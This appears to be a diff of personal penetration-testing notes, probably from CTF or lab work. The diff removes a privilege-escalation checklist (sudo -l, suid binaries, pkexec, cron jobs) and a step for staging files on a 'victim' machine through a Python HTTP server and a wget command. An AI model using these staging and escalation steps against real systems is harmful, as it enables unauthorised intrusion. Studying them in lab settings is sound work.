@@ -154,28 +154,7 @@ We can automate this with **sqlmap**
 
 ## Local File Inclusion
 
-sudo -l
-
-service:
-
-- setuid/setgid
-- cron jobs
-
 ---
-
-## Uploading File from Local Attack  Machine to Victim
-
-### Method 1
-
-start python server wherever file is located
-
-`python -m http.server 80`
-
-On victim machine, download file as follows
-
-`wget http://(remote IP)/(file)`
-
-- use ifconfig to find IP
 
 ## Other
 
@@ -193,16 +172,3 @@ On victim machine, download file as follows
     - `export DC=10.200.70.101`
 - then we can use this IP using $DC
 
-Opened files by processes in 
-
-Sockets
-
-D-bus
-
-pkexec old version exploitation ? w/ suid bit 
-
-adm group for logs
-
-look for unknown suid binaries
-
-setuid = binary always executed with permission of owner
